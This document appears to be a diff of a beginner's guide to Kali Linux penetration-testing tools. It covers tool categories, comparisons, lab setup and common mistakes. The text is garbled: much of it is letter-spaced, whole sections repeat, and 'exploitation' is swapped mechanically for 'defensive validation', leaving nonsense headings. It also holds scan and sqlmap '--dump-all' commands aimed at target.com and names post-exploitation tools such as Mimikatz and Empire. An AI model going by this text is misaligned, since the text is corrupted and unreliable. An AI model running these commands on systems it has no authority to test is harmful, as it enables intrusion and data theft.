-┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐  
-│  P r o f e s s i o n a l  S t a n d a r d s  │  
-└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘  
-
-4. Post-Exploitation  
+○ Have rollback plans ready
+UsingKaliLinuxtoolsrequiresstrictadherenceto legal and ethical guidelines:
+│ Ethical Usage Framework │
+│ Authorization │
+│ Documentation │ │ Scope
+│ Definition
+│ │ Required
+│ │ Mandatory │
+│ Professional Standards │
+4. Post-defensive validation
 ○ Windows: Mimikatz, PowerSploit
 ○ Linux: LinEnum, LinPEAS
-○ Persistence: Empire, Covenant  
-5. Reporting  
+○ Persistence: Empire, Covenant
+5. Reporting
 ○ Collaboration: Dradis, Faraday
 ○ Documentation: CherryTree, Screenshots
-○ Analysis: Pipal, custom scripts  
+○ Analysis: Pipal, custom scripts
 For beginners entering the cybersecurity field, focusing on foundational tools
-provides the best learning path:  
-1. Start with Network Basics:  
-○ Nmap: Master basic port scanning before advanced features  
+provides the best learning path:
+1. Start with Network Basics:
+○ Nmap: Master basic port scanning before advanced features
 The Kali Linux toolkit represents an extensive collection of specialized security
 tools that enable professionals to conduct thorough security assessments
 across diverse environments. From the versatility of Nmap for network
-reconnaissance to the comprehensive capabilities of Metasploit for exploitation,
-each tool serves specific purposes within the security testing lifecycle.  
-Mastery of these tools requires not just technical knowledge but also  
-understanding of their appropriate application, legal implications, and integration  
-possibilities. The 50 tools covered in this guide form the core arsenal for security  
-professionals, but true expertise comes from knowing when and how to apply  
-each tool effectively.  
-As the security landscape continues to evolve, these tools are regularly updated  
-and new tools emerge. Staying current with tool capabilities, practicing in legal  
-environments, and maintaining ethical standards are essential for professional  
-growth in cybersecurity. The combination of technical proficiency, methodical  
-approach, and ethical practice distinguishes professional security assessments  
-from malicious activities.  
-Remember that tools are only as effective as the professionals using them.  
-Continuous learning, hands-on practice, and staying informed about emerging  
-threats and techniques will ensure these powerful tools are used to strengthen  
-security rather than compromise it.  
-C o n c l u s i o n  
-F r e q u e n t l y  A s k e d  Q u e s t i o n s  
-Which Kali Linux tools should beginners focus on first?  
-
+reconnaissance to the comprehensive capabilities of Metasploit for defensive validation,
+each tool serves specific purposes within the security testing lifecycle.
+Mastery of these tools requires not just technical knowledge but also
+understanding of their appropriate application, legal implications, and integration
+possibilities. The 50 tools covered in this guide form the core arsenal for security
+professionals, but true expertise comes from knowing when and how to apply
+each tool effectively.
+As the security landscape continues to evolve, these tools are regularly updated
+and new tools emerge. Staying current with tool capabilities, practicing in legal
+environments, and maintaining ethical standards are essential for professional
+growth in cybersecurity. The combination of technical proficiency, methodical
+approach, and ethical practice distinguishes professional security assessments
+from malicious activities.
+Remember that tools are only as effective as the professionals using them.
+Continuous learning, hands-on practice, and staying informed about emerging
+threats and techniques will ensure these powerful tools are used to strengthen
+security rather than compromise it.
+Conclusion
+Frequently Asked Questions
+Which Kali Linux tools should beginners focus on first?
 1.
-2. Online Platforms:  
+2. Online Platforms:
 ○ TryHackMe: Guided learning paths with legal targets
 ○ HackTheBox: Realistic environments for practice
 ○ PentesterLab: Web application security focus
 ○ OverTheWire: Wargames and challenges
-○ VulnHub: Downloadable vulnerable VMs  
-Creating a safe, legal practice environment is essential for developing skills:  
-Virtual Lab Environments:  
+○ VulnHub: Downloadable vulnerable VMs
+Creating a safe, legal practice environment is essential for developing skills:
+Virtual Lab Environments:
 ○ Wireshark: Understand network protocols through packet analysis
-○ Netcat: Learn networking fundamentals through this versatile tool  
-2. Web Application Testing:  
+○ Netcat: Learn networking fundamentals through this versatile tool
+2. Web Application Testing:
 ○ Burp Suite Community: Essential for understanding web security
 ○ OWASP ZAP: Free alternative with good learning resources
-○ Nikto: Simple yet effective for basic web scanning  
-3. Information Gathering:  
+○ Nikto: Simple yet effective for basic web scanning
+3. Information Gathering:
 ○ theHarvester: Easy to use for OSINT collection
 ○ Whois/DNS tools: Understand information disclosure
-○ Google Dorking: Master advanced search techniques  
-4. Vulnerability Analysis:  
+○ Google Dorking: Master advanced search techniques
+4. Vulnerability Analysis:
 ○ Searchsploit: Learn about existing vulnerabilities
 ○ Nmap scripts: Use NSE for vulnerability detection
-○ OpenVAS: Understand vulnerability scanning concepts  
-5. Basic Exploitation:  
+○ OpenVAS: Understand vulnerability scanning concepts
+5. Basic defensive validation:
 ○ Metasploit: Start with auxiliary modules before exploits
-○ Hydra: Understand password attacks safely
-○ John the Ripper: Learn password cracking basics  
-Focus on understanding how each tool works rather than memorizing  
-commands. Practice in legal lab environments and gradually expand your  
-toolkit.  
+○ Hydra: Understand password security test safely
+○ John the Ripper: Learn password cracking basics
+Focus on understanding how each tool works rather than memorizing
+commands. Practice in legal lab environments and gradually expand your
+toolkit.
 How can I practice using Kali Linux tools legally and
-safely?  
+safely?
 #  V i r t u a l B o x / V M w a r e  s e t u p
--  I n s t a l l  K a l i  L i n u x  a s  V M
--  C r e a t e  v u l n e r a b l e  t a r g e t  V M s :  
+- Install Kali Linux as VM
+- Create vulnerable target V M s :
 -  M e t a s p l o i t a b l e  2 / 3
 -  D V W A  ( D a m n  V u l n e r a b l e  W e b  A p p l i c a t i o n )
--  V u l n H u b  m a c h i n e s
--  H a c k T h e B o x  ( w i t h  s u b s c r i p t i o n )  
-
-Home Lab Setup:  
+- VulnHub machines
+-  H a c k T h e B o x  ( w i t h  s u b s c r i p t i o n )
+Home Lab Setup:
 3.
-4. Cloud-Based Labs:  
+4. Cloud-Based Labs:
 ○ AWS/Azure free tiers for cloud security testing
 ○ Docker containers for quick deployments
-○ Kubernetes clusters for container security  
-5. Legal Considerations:  
+○ Kubernetes clusters for container security
+5. Legal Considerations:
 ○ Never test systems you don't own
 ○ Obtain written permission for any external testing
 ○ Use VPN for platform-provided labs only
-○ Keep detailed logs of all practice activities  
+○ Keep detailed logs of all practice activities
 Understanding tool categorization by testing phase improves assessment
-efficiency:  
-1. Reconnaissance Tools:  
-○ Passive: No direct target interaction (theHarvester, Maltego, Shodan)  
-○ Active: Direct target probing (Nmap, Masscan, Fierce)  
-○ Purpose: Information gathering without alerting targets  
-○ Usage: Always start here to understand the target  
-2. Scanning and Enumeration Tools:  
-○ Service identification: Version detection and banner grabbing  
-○ Vulnerability correlation: Matching services to known vulnerabilities  
-○ Purpose: Detailed technical information gathering  
-○ Key tools: Nmap, Enum4linux, SMBclient, SNMP-walk  
-3. Vulnerability Assessment Tools:  
-○ Automated scanners: Broad vulnerability detection (OpenVAS, Nessus)  
-○ Specialized scanners: Focused on specific technologies (WPScan,  
-SQLMap)  
-○ Purpose: Identify potential security weaknesses  
-○ Balance: Automated scanning with manual verification  
-4. Exploitation Tools:  
-○ Frameworks: Comprehensive exploitation platforms (Metasploit, BeEF)  
-○ Standalone: Specific security diagnostic test tools (SQLMap, THC-Hydra)  
-○ Purpose: Verify vulnerabilities through controlled exploitation  
-#  B a s i c  h o m e  l a b  n e t w o r k  -  I s o l a t e d
-n e t w o r k  s e g m e n t  -  M u l t i p l e  V M s  f o r
-d i f f e r e n t  s c e n a r i o s  -  N o  c o n n e c t i o n  t o
-p r o d u c t i o n  n e t w o r k s  -  R e g u l a r  s n a p s h o t s
-f o r  r e s e t  
+efficiency:
+1. Reconnaissance Tools:
+○ Passive: No direct target interaction (theHarvester, Maltego, Shodan)
+○ Active: Direct target probing (Nmap, Masscan, Fierce)
+○ Purpose: Information gathering without alerting targets
+○ Usage: Always start here to understand the target
+2. Scanning and Enumeration Tools:
+○ Service identification: Version detection and banner grabbing
+○ Vulnerability correlation: Matching services to known vulnerabilities
+○ Purpose: Detailed technical information gathering
+○ Key tools: Nmap, Enum4linux, SMBclient, SNMP-walk
+3. Vulnerability Assessment Tools:
+○ Automated scanners: Broad vulnerability detection (OpenVAS, Nessus)
+○ Specialized scanners: Focused on specific technologies (WPScan,
+SQLMap)
+○ Purpose: Identify potential security weaknesses
+○ Balance: Automated scanning with manual verification
+4. defensive validation Tools:
+○ Frameworks: Comprehensive defensive validation platforms (Metasploit, BeEF)
+○ Standalone: Specific security diagnostic test tools (SQLMap, THC-Hydra)
+○ Purpose: Verify vulnerabilities through controlled defensive validation
+# Basic home lab network - Isolated
+network segment - Multiple VMs for
+different scenarios - No connection to
+production networks - Regular snapshots
+for reset
 What are the essential differences between Kali Linux
-tools for different testing phases?  
-
-Network Scanners:  
-Password Crackers:  
-○ Caution: High impact, use only with explicit permission  
-5. Post-Exploitation Tools:  
+tools for different testing phases?
+Network Scanners:
+Password Crackers:
+○ Caution: High impact, use only with explicit permission
+5. Post-defensive validation Tools:
 ○ Persistence: Maintaining access (Empire, Mimikatz)
 ○ Lateral movement: Expanding access (CrackMapExec, PSExec)
 ○ Purpose: Demonstrate impact and data access risks
-○ Critical: Document everything, minimize system changes  
+○ Critical: Document everything, minimize system changes
 Selecting between similar tools requires understanding their strengths and use
-cases:  
-Web Scanners Comparison:  
-How do I choose between similar tools in Kali Linux?  
-N m a p  v s  M a s s c a n  v s  Z m a p :
--  N m a p :  F e a t u r e - r i c h ,  a c c u r a t e
--  M a s s c a n :  I n t e r n e t - s c a l e  s c a n n i n g
--  Z m a p :  S p e c i a l i z e d  f o r  r e s e a r c h
-N m a p  f o r  p r e c i s i o n ,  M a s s c a n  f o r  s p e e d  
-J o h n  t h e  R i p p e r  v s  H a s h c a t :
--  J o h n :  C P U - b a s e d ,  b e t t e r  f o r  q u i c k  c r a c k s
--  H a s h c a t :  G P U - a c c e l e r a t e d ,  f a s t e r  f o r  l a r g e  o p e r a t i o n s
-C h o o s e  b a s e d  o n  h a r d w a r e  a n d  h a s h  c o m p l e x i t y  
-H y d r a  v s  M e d u s a  v s  N c r a c k :
--  H y d r a :  M o s t  p r o t o c o l s  s u p p o r t e d
--  M e d u s a :  S t a b l e ,  m o d u l a r  d e s i g n
--  N c r a c k :  H i g h - p e r f o r m a n c e  e n g i n e
-H y d r a  f o r  v e r s a t i l i t y ,  N c r a c k  f o r  s p e e d  
-B u r p  S u i t e  v s  O W A S P  Z A P :
--  B u r p :  B e t t e r  U I ,  e x t e n s i v e  e x t e n s i o n s ,  i n d u s t r y  s t a n d a r d
--  Z A P :  F r e e ,  a u t o m a t e d  s c a n n i n g ,  g o o d  A P I
-C h o o s e  B u r p  f o r  m a n u a l  t e s t i n g ,  Z A P  f o r  a u t o m a t i o n  
-N i k t o  v s  D i r b  v s  G o b u s t e r :
--  N i k t o :  C o m p r e h e n s i v e  w e b  s c a n n e r
--  D i r b :  C l a s s i c  d i r e c t o r y  b r u t e - f o r c e r
--  G o b u s t e r :  F a s t ,  m o d e r n  a l t e r n a t i v e  t o  D i r b
-U s e  N i k t o  f o r  g e n e r a l  s c a n n i n g ,  G o b u s t e r  f o r  d i r e c t o r i e s  
-
-Poor Documentation:  
-Exploitation Frameworks:  
-Over-Aggressive Scanning:  
-Avoiding common pitfalls improves both effectiveness and professionalism:  
-Scanning Without Permission:  
-M e t a s p l o i t  v s  B e E F  v s  E m p i r e :
--  M e t a s p l o i t :  G e n e r a l  e x p l o i t a t i o n
--  B e E F :  B r o w s e r - f o c u s e d  a t t a c k s
--  E m p i r e :  P o s t - e x p l o i t a t i o n  f o c u s
-C h o o s e  b a s e d  o n  a t t a c k  v e c t o r  
-#  W R O N G :  M a y  c r a s h  s e r v i c e s
-n m a p  - T 5  - A  - s V  - p -  - - s c r i p t = v u l n *  t a r g e t . c o m  
-#  R I G H T :  M e a s u r e d  a p p r o a c h
-n m a p  - T 3  - s V  - p  8 0 , 4 4 3 , 2 2  t a r g e t . c o m  
-#  W R O N G :  N o  l o g g i n g  o r  d o c u m e n t a t i o n
-s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - d u m p - a l l  
-#  R I G H T :  C o m p r e h e n s i v e  l o g g i n g
+cases:
+Web Scanners Comparison:
+How do I choose between similar tools in Kali Linux?
+Nmap vs Masscan vs Z m a p :
+- N m a p : F e a t u r e - r i c h , accurate
+- M a s s c a n : I n t e r n e t - s c a l e scanning
+- Z m a p : Specialized for research
+Nmap for p r e c i s i o n , Masscan for speed
+John the Ripper vs H a s h c a t :
+- J o h n : C P U - b a s e d , better for quick cracks
+- H a s h c a t : G P U - a c c e l e r a t e d , faster for large operations
+Choose based on hardware and hash complexity
+Hydra vs Medusa vs N c r a c k :
+- H y d r a : Most protocols supported
+- M e d u s a : S t a b l e , modular design
+- N c r a c k : H i g h - p e r f o r m a n c e engine
+Hydra for v e r s a t i l i t y , Ncrack for speed
+Burp Suite vs OWASP Z A P :
+- B u r p : Better U I , extensive e x t e n s i o n s , industry standard
+- Z A P : F r e e , automated s c a n n i n g , good API
+Choose Burp for manual t e s t i n g , ZAP for automation
+Nikto vs Dirb vs G o b u s t e r :
+- N i k t o : Comprehensive web scanner
+- D i r b : Classic directory b r u t e - f o r c e r
+- G o b u s t e r : F a s t , modern alternative to Dirb
+Use Nikto for general s c a n n i n g , Gobuster for directories
+Poor Documentation:
+defensive validation Frameworks:
+Over-Aggressive Scanning:
+Avoiding common pitfalls improves both effectiveness and professionalism:
+Scanning Without Permission:
+Metasploit vs BeEF vs E m p i r e :
+- M e t a s p l o i t : General defensive validation
+- B e E F : B r o w s e r - f o c u s e d security test
+- E m p i r e : P o s t - e x p l o i t a t i o n focus
+Choose based on security test vector
+# W R O N G : May crash services
+n m a p  - T 5  - A  - s V  - p -  - - s c r i p t = v u l n *  t a r g e t . c o m
+# R I G H T : Measured approach
+n m a p  - T 3  - s V  - p  8 0 , 4 4 3 , 2 2  t a r g e t . c o m
+# W R O N G : No logging or documentation
+s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - d u m p - a l l
+# R I G H T : Comprehensive logging
 s q l m a p  - u  " h t t p : / / t a r g e t . c o m / p a g e ? i d = 1 "  - - b a t c h  - v 3
-- - o u t p u t - d i r = . / s q l m a p _ r e s u l t s /  
-#  W R O N G :  S c a n n i n g  r a n d o m  i n t e r n e t  t a r g e t s
-n m a p  - s V  s c a n m e . n m a p . o r g  #  E v e n  t h i s  r e q u i r e s  c o n s i d e r a t i o n  
-#  R I G H T :  O n l y  s c a n  a u t h o r i z e d  t a r g e t s
-n m a p  - s V  1 9 2 . 1 6 8 . 1 . 1 0 0  #  Y o u r  o w n  l a b  n e t w o r k  
+- - o u t p u t - d i r = . / s q l m a p _ r e s u l t s /
+# W R O N G : Scanning random internet targets
+nmap - s V s c a n m e . n m a p . o r g # Even this requires consideration
+# R I G H T : Only scan authorized targets
+n m a p  - s V  1 9 2 . 1 6 8 . 1 . 1 0 0  #  Y o u r  o w n  l a b  n e t w o r k
 What are the most common mistakes when using Kali
-Linux tools?  
-
+Linux tools?
 ● Kali Linux Official Documentation
 ● Offensive Security Training
 ● SANS Penetration Testing Resources
@@ -1516,35 +1394,33 @@ Linux tools?
 ● Burp Suite Documentation
 ● Nmap Reference Guide
 ● HackTricks - Pentesting Methodology
-● PayloadsAllTheThings
-● GTFOBins - Unix Binaries Exploitation  
-Ignoring Scope:  
-○ Always verify IP ranges and domains  
-○ Check for cloud services that may be out of scope  
-○ Respect time windows for testing  
-○ Avoid testing production systems during business hours  
-Inadequate Cleanup:  
-
-Tool Dependency:  
-○ Don't rely solely on automated tools  
-○ Understand what tools are doing  
-○ Verify automated findings manually  
-○ Develop manual testing skills  
-Legal and Ethical Violations:  
-○ Never exceed authorized scope  
-○ Don't share client data  
-○ Report findings appropriately  
-○ Maintain confidentiality  
-Remember: Tools don't make the professional—knowledge, ethics, and  
-methodology do.  
-#  A l w a y s  r e m o v e :
--  B a c k d o o r s  a n d  s h e l l s
--  C r e a t e d  u s e r  a c c o u n t s
--  M o d i f i e d  c o n f i g u r a t i o n s
--  T e s t  f i l e s  a n d  s c r i p t s
--  L o g  e n t r i e s  w h e r e  a u t h o r i z e d  
-R e l a t e d  A r t i c l e s  a n d  R e s o u r c e s  
-
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
+● GTFOBins - Unix Binaries defensive validation
+Ignoring Scope:
+○ Always verify IP ranges and domains
+○ Check for cloud services that may be out of scope
+○ Respect time windows for testing
+○ Avoid testing production systems during business hours
+Inadequate Cleanup:
+Tool Dependency:
+○ Don't rely solely on automated tools
+○ Understand what tools are doing
+○ Verify automated findings manually
+○ Develop manual testing skills
+Legal and Ethical Violations:
+○ Never exceed authorized scope
+○ Don't share client data
+○ Report findings appropriately
+○ Maintain confidentiality
+Remember: Tools don't make the professional—knowledge, ethics, and
+methodology do.
+# Always r e m o v e :
+- Backdoors and shells
+- Created user accounts
+- Modified configurations
+- Test files and scripts
+- Log entries where authorized
+Related Articles and Resources
 ● Kali Linux Official Documentation
 ● Offensive Security Training
 ● SANS Penetration Testing Resources
@@ -1553,31 +1429,41 @@ R e l a t e d  A r t i c l e s  a n d  R e s o u r c e s
 ● Burp Suite Documentation
 ● Nmap Reference Guide
 ● HackTricks - Pentesting Methodology
-● PayloadsAllTheThings
-● GTFOBins - Unix Binaries Exploitation  
-Ignoring Scope:  
-○ Always verify IP ranges and domains  
-○ Check for cloud services that may be out of scope  
-○ Respect time windows for testing  
-○ Avoid testing production systems during business hours  
-Inadequate Cleanup:  
+> [Defensive notice: Actionable exploit, malware, credential theft, phishing, or unauthorized access instructions were omitted. Use authorized defensive testing, monitoring, and hardening workflows instead.]
+● GTFOBins - Unix Binaries defensive validation
+Ignoring Scope:
+○ Always verify IP ranges and domains
+○ Check for cloud services that may be out of scope
+○ Respect time windows for testing
+○ Avoid testing production systems during business hours
+Inadequate Cleanup:
+Tool Dependency:
+○ Don't rely solely on automated tools
+○ Understand what tools are doing
+○ Verify automated findings manually
+○ Develop manual testing skills
+Legal and Ethical Violations:
+○ Never exceed authorized scope
+○ Don't share client data
+○ Report findings appropriately
+○ Maintain confidentiality
+Remember: Tools don't make the professional—knowledge, ethics, and
+methodology do.
+# Always r e m o v e :
+- Backdoors and shells
+- Created user accounts
+- Modified configurations
+- Test files and scripts
+- Log entries where authorized
+Related Articles and Resources
 
-Tool Dependency:  
-○ Don't rely solely on automated tools  
-○ Understand what tools are doing  
-○ Verify automated findings manually  
-○ Develop manual testing skills  
-Legal and Ethical Violations:  
-○ Never exceed authorized scope  
-○ Don't share client data  
-○ Report findings appropriately  
-○ Maintain confidentiality  
-Remember: Tools don't make the professional—knowledge, ethics, and  
-methodology do.  
-#  A l w a y s  r e m o v e :
--  B a c k d o o r s  a n d  s h e l l s
--  C r e a t e d  u s e r  a c c o u n t s
--  M o d i f i e d  c o n f i g u r a t i o n s
--  T e s t  f i l e s  a n d  s c r i p t s
--  L o g  e n t r i e s  w h e r e  a u t h o r i z e d  
-R e l a t e d  A r t i c l e s  a n d  R e s o u r c e s
+---
+
+## Educational Use Notice
+
+This content is provided strictly for educational purposes, defensive security awareness, system administration, diagnostics, and ethical learning environments.
+
+Always obtain proper authorization before testing systems or networks. The information published on this website is intended to promote responsible security practices, auditing, monitoring, and infrastructure hardening.
+
+---
+
